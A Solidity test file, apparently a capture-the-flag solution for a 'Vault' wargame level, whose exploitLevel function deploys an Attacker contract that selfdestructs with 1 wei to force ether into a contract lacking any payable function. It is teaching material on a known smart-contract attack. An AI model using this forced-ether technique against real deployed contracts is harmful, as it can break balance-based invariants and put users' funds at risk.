// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Vault.sol";
import "src/levels/VaultFactory.sol";

contract TestVault is BaseTest {
    Vault private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new VaultFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Vault(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // Since the Vault contract doesn't have a payable fn or a receive/ fallback fn
        // the only way to send ether to it is by destroying a contract and sending all its ether balance
        // to the Vault contract

        // Selfdestruct destroys the contract and send all its ether balance to the target address
        new Attacker{value: 1 wei}(level);

        vm.stopPrank();
    }
}

contract Attacker {
    constructor(Vault _level) public payable {
        selfdestruct(payable(address(_level)));
    }
}
